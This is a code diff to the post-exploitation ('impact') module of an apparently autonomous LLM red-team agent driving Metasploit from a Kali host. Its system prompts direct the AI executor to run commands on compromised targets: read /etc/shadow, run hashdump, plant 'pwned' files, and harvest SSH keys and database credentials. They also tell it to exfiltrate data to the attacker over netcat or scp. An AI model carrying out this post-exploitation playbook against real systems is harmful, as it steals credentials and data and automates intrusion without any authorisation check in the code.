@@ -37,7 +37,7 @@ from core_agents.common import (
 )
 from core_agents.state import ImpactFindings
 from tools.rag import query_knowledge_base
-from tools.metasploit_tools import msf_session
+from tools.metasploit_tools import msf_session, tool_session_command
 
 # =============================================================================
 # CONSTANTS
@@ -72,12 +72,11 @@ class ImpactState(TypedDict):
 @tool
 def tool_linux_terminal(command: str):
     """
-    Execute a shell command on the Kali machine via SSH.
-    Use this to execute impact actions through the active session:
-    - Read sensitive files (shadow, passwd, configs)
-    - Plant flag files as proof of access
-    - Exfiltrate data back to Kali
-    - Gather system intelligence
+    Execute a shell command on the KALI ATTACKER machine via SSH.
+    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
+    - Receiving exfiltrated files, checking listeners, SSH login tests.
+
+    To run commands on the TARGET, use tool_session_command instead.
 
     NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
     """
@@ -90,22 +89,25 @@ def tool_linux_terminal(command: str):
 @tool
 def tool_metasploit_rpc(command: str):
     """
-    Execute a command on the active Metasploit console.
-    Use for session interaction, file download/upload, hashdump.
-    - 'sessions -i <id>' to interact with session
-    - 'download <remote_path> <local_path>' (Meterpreter)
-    - 'hashdump' (Meterpreter) for credential harvesting
-    - 'run post/linux/gather/*' for intel gathering
+    Execute a command on the Metasploit CONSOLE.
+    Use ONLY for MSF console commands: listing sessions, background, use, set, run, hashdump.
+
+    Do NOT use this for running commands on the target — use tool_session_command instead.
     """
-    try:
-        return msf_session.send_command(command)
-    except Exception as e:
-        return f"RPC Error: {str(e)}"
+    for attempt in range(3):
+        try:
+            return msf_session.send_command(command)
+        except Exception as e:
+            if attempt < 2 and "connection" in str(e).lower():
+                print_colored(f"[Impact MSF] Connection error, retrying ({attempt+1}/3)...", Colors.WARNING)
+                time.sleep(2)
+                continue
+            return f"RPC Error: {str(e)}"
 
 
 # Tool sets
 PLANNER_TOOLS = [query_knowledge_base]
-EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc]
+EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
 
 # =============================================================================
 # SYSTEM PROMPTS
@@ -120,6 +122,11 @@ You receive:
 4. ACCESS LEVEL — current privilege level
 5. CRITIC FEEDBACK — if retrying, what was missing
 
+**TOOL CLARITY — 3 tools, 3 different targets:**
+- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for all target commands: whoami, id, cat, echo, etc.)
+- `tool_linux_terminal(command)` → runs ON KALI only (receiving files, listeners, SSH tests)
+- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, hashdump, etc.)
+
 **You have access to `query_knowledge_base`** — search for post-exploitation and data exfiltration techniques.
 You may make up to {MAX_PLANNER_TOOL_CALLS} queries.
 
@@ -128,20 +135,20 @@ You may make up to {MAX_PLANNER_TOOL_CALLS} queries.
 **Standard impact actions (choose based on objective + access level):**
 
 For "get a shell" / "gain access" objectives:
-1. Run `whoami` and `id` — proof of access
-2. Read `/etc/shadow` (if root) — proof of root
-3. Create a flag file: `echo "COMPROMISED by Red Team $(date)" > /root/pwned.txt`
-4. Gather system info: `hostname`, `ip addr`, `cat /etc/os-release`
+1. Run `whoami` and `id` on TARGET via tool_session_command — proof of access
+2. Read `/etc/shadow` (if root) via tool_session_command — proof of root
+3. Create any flag/proof file via tool_session_command (e.g., `echo "pwned" > /root/i_got_in.txt`)
+4. Gather system info via tool_session_command: `hostname`, `ip addr`, `cat /etc/os-release`
 
 For "exfiltrate data" objectives:
-1. Locate target data (find files, read configs)
+1. Locate target data via tool_session_command (find files, read configs)
 2. Copy data to Kali via netcat, scp, or Meterpreter download
-3. Verify data received on Kali
+3. Verify data received on Kali via tool_linux_terminal
 
 For "demonstrate full control" objectives:
 1. All of the above, plus:
-2. List running services, installed software
-3. Read SSH keys, application configs, database creds
+2. List running services, installed software via tool_session_command
+3. Read SSH keys, application configs, database creds via tool_session_command
 4. Create proof bundle: system info + credentials + network info
 
 **Output format (final answer — no more tool calls):**
@@ -149,8 +156,8 @@ For "demonstrate full control" objectives:
 IMPACT PLAN:
 OBJECTIVE INTERPRETATION: <what "success" means for this specific objective>
 ACTIONS:
-1. <action description> — COMMAND: <exact command>
-2. <action description> — COMMAND: <exact command>
+1. <action description> — TOOL: tool_session_command, COMMAND: <exact command>
+2. <action description> — TOOL: tool_linux_terminal, COMMAND: <exact command>
 ...
 
 SUCCESS CRITERIA: <what evidence proves the objective was met>
@@ -161,43 +168,40 @@ SUCCESS CRITERIA: <what evidence proves the objective was met>
 - Try alternative approaches to gather evidence
 """
 
-EXECUTOR_PROMPT = f"""You are an Impact Executor for a Red Team agent. Your attacker IP is {KALI_IP}.
+EXECUTOR_PROMPT_TEMPLATE = """You are an Impact Executor for a Red Team agent. Your attacker IP is {kali_ip}.
 
-You have access to `tool_linux_terminal` (SSH to Kali) and `tool_metasploit_rpc` (MSF console).
+You have 3 tools — each runs in a DIFFERENT place:
 
-**Your job:** Execute the impact plan and collect concrete proof.
+**TOOL CLARITY:**
+- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL target commands)
+- `tool_linux_terminal(command)` → runs ON KALI only (receiving files, checking listeners)
+- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, background, etc. — NOT for target commands)
+
+**CRITICAL:** To run commands on the target, ALWAYS use `tool_session_command`. This is reliable and atomic.
+Do NOT use `tool_metasploit_rpc` for target commands — it goes through the MSF console which is unreliable.
+Do NOT use `tool_linux_terminal` for target commands — that runs on Kali, not the target.
+
+**STEP-BY-STEP EXAMPLE (session {session_id}):**
+1. Call tool_session_command("{session_id}", "whoami")
+   → Output: "root"
+2. Call tool_session_command("{session_id}", "id")
+   → Output: "uid=0(root)..."
+3. Call tool_session_command("{session_id}", "cat /etc/shadow")
+   → Output: "root:$6$..."
+4. Call tool_session_command("{session_id}", "echo 'COMPROMISED by Red Team' > /root/pwned.txt")
+   → Creates file on the TARGET
+5. Call tool_session_command("{session_id}", "cat /root/pwned.txt")
+   → Output: "COMPROMISED by Red Team" (verifies file creation)
+
+**Your job:** Execute the impact plan and collect concrete proof ON THE TARGET.
 
 **Rules:**
 1. Execute commands ONE AT A TIME via tools
-2. READ each output — this IS the proof
-3. SAVE important outputs — they become evidence
-4. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands
-5. When working through a session:
-   - Meterpreter: `tool_metasploit_rpc` with 'sessions -i <id>'
-   - Command shell: `tool_metasploit_rpc` with 'sessions -i <id>' then commands
-
-**Key evidence-gathering commands:**
-
-Access proof:
-- `whoami` — current user
-- `id` — UID/GID details
-- `hostname` — system name
-- `ip addr` or `ifconfig` — network config
-
-Credential proof (root only):
-- `cat /etc/shadow` — password hashes
-- `cat /etc/passwd` — user accounts
-
-Flag planting:
-- `echo "COMPROMISED by Red Team $(date)" > /tmp/pwned.txt`
-- `cat /tmp/pwned.txt` — verify flag was written
-
-System intelligence:
-- `uname -a` — kernel version
-- `cat /etc/os-release` — OS details
-- `df -h` — disk usage
-- `last` — login history
-- `cat /etc/ssh/sshd_config` — SSH config
+2. Your VERY FIRST tool call MUST be: `tool_session_command("{session_id}", "whoami")`
+3. READ each output — this IS the proof
+4. SAVE important outputs — they become evidence
+5. Do NOT run more than {max_tools} commands
+6. ALL evidence-gathering and file creation must happen ON THE TARGET via `tool_session_command`
 
 **When done, provide a structured text summary of ALL evidence collected.**
 Include the actual command outputs as proof.
@@ -337,18 +341,25 @@ def executor_node(state: ImpactState) -> dict:
     if not executor_msgs:
         executor_msgs = [messages[-1]]
 
+    # Build dynamic executor prompt with actual session ID
+    executor_prompt = EXECUTOR_PROMPT_TEMPLATE.format(
+        kali_ip=KALI_IP,
+        session_id=state.get("session_id", "?"),
+        max_tools=MAX_EXECUTOR_TOOL_CALLS,
+    )
+
     if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
         print_colored(f"[Impact Executor] Tool cap ({executor_tool_count}).", Colors.WARNING)
         response = call_llm(
             messages=executor_msgs + [HumanMessage(content=(
                 "Max tool calls reached. Summarize all evidence collected so far."
             ))],
-            system_prompt=EXECUTOR_PROMPT
+            system_prompt=executor_prompt
         )
     else:
         response = call_llm(
             messages=executor_msgs,
-            system_prompt=EXECUTOR_PROMPT,
+            system_prompt=executor_prompt,
             tools=EXECUTOR_TOOLS
         )
 
@@ -571,7 +582,10 @@ def run_impact(
             f"Execute impact actions for objective: {objective}\n"
             f"Target: {target_ip}\n"
             f"Session: {session_type} (ID: {session_id})\n"
-            f"Access level: {access_level}"
+            f"Access level: {access_level}\n\n"
+            f"IMPORTANT: To run commands on the target, use tool_session_command(\"{session_id}\", \"<command>\").\n"
+            f"This runs directly on the target via the MSF session API — reliable and atomic.\n"
+            f"Do NOT use tool_metasploit_rpc for target commands. Do NOT use tool_linux_terminal for target commands."
         ))],
         "target_ip": target_ip,
         "objective": objective,
@@ -595,39 +609,65 @@ def run_impact(
     print_colored(f"  Thread: {thread_id}", Colors.HEADER)
     print_colored(f"{'='*60}\n", Colors.HEADER)
 
-    for event in app.stream(initial_state, config=config):
-        for key, value in event.items():
-            if not value or "messages" not in value:
-                continue
-            msgs = value["messages"]
-            if not isinstance(msgs, list):
-                msgs = [msgs]
-            for msg in msgs:
-                if not isinstance(msg, BaseMessage) or not msg.content:
-                    continue
-                if "CRITIC FEEDBACK" in msg.content:
-                    print_colored(f"\n{msg.content}", Colors.FAIL)
-                elif isinstance(msg, ToolMessage):
-                    display = msg.content[:500]
-                    if len(msg.content) > 500:
-                        display += "... [truncated]"
-                    print(f"\n[Tool Output]: {display}")
-                elif isinstance(msg, AIMessage):
-                    content = msg.content
-                    if "[Impact Planner]" in content:
-                        print_colored(f"\n{content[:400]}", Colors.OKBLUE)
-                    elif "[Impact Critic]" in content:
-                        color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
-                        print_colored(f"\n{content[:400]}", color)
-                    else:
-                        print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)
+    # --- Session health check: verify session is still alive ---
+    try:
+        session_check = msf_session.send_command(f"sessions")
+        session_check_str = str(session_check)
+        if session_id not in session_check_str:
+            print_colored(f"[Impact] Session {session_id} NOT found in active sessions — skipping impact.", Colors.WARNING)
+            print_colored(f"[Impact] Active sessions output: {session_check_str[:300]}", Colors.WARNING)
+            return ImpactFindings(
+                success=False,
+                actions=[],
+                summary=f"Impact skipped — session {session_id} is no longer active.",
+            )
+        print_colored(f"[Impact] Session {session_id} confirmed alive.", Colors.OKGREEN)
+    except Exception as e:
+        print_colored(f"[Impact] Session health check failed: {e}", Colors.WARNING)
+        # Try to continue anyway — the session might still work
 
-                if hasattr(msg, "tool_calls") and msg.tool_calls:
-                    for t in msg.tool_calls:
-                        print_colored(
-                            f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
-                            Colors.OKCYAN
-                        )
+    try:
+        for event in app.stream(initial_state, config=config):
+            for key, value in event.items():
+                if not value or "messages" not in value:
+                    continue
+                msgs = value["messages"]
+                if not isinstance(msgs, list):
+                    msgs = [msgs]
+                for msg in msgs:
+                    if not isinstance(msg, BaseMessage) or not msg.content:
+                        continue
+                    if "CRITIC FEEDBACK" in msg.content:
+                        print_colored(f"\n{msg.content}", Colors.FAIL)
+                    elif isinstance(msg, ToolMessage):
+                        display = msg.content[:500]
+                        if len(msg.content) > 500:
+                            display += "... [truncated]"
+                        print(f"\n[Tool Output]: {display}")
+                    elif isinstance(msg, AIMessage):
+                        content = msg.content
+                        if "[Impact Planner]" in content:
+                            print_colored(f"\n{content[:400]}", Colors.OKBLUE)
+                        elif "[Impact Critic]" in content:
+                            color = Colors.OKGREEN if "PASS" in content else Colors.FAIL
+                            print_colored(f"\n{content[:400]}", color)
+                        else:
+                            print_colored(f"\nAgent: {content[:400]}", Colors.OKGREEN)
+
+                    if hasattr(msg, "tool_calls") and msg.tool_calls:
+                        for t in msg.tool_calls:
+                            print_colored(
+                                f"   (Calling Tool: {t['name']} args: {str(t['args'])[:200]}...)",
+                                Colors.OKCYAN
+                            )
+    except Exception as e:
+        print_colored(f"\n[Impact] Subgraph crashed: {e}", Colors.FAIL)
+        print_colored("[Impact] Returning graceful failure.", Colors.WARNING)
+        return ImpactFindings(
+            success=False,
+            actions=[],
+            summary=f"Impact crashed: {str(e)[:200]}",
+        )
 
     final_snapshot = app.get_state(config)
     final_state = final_snapshot.values
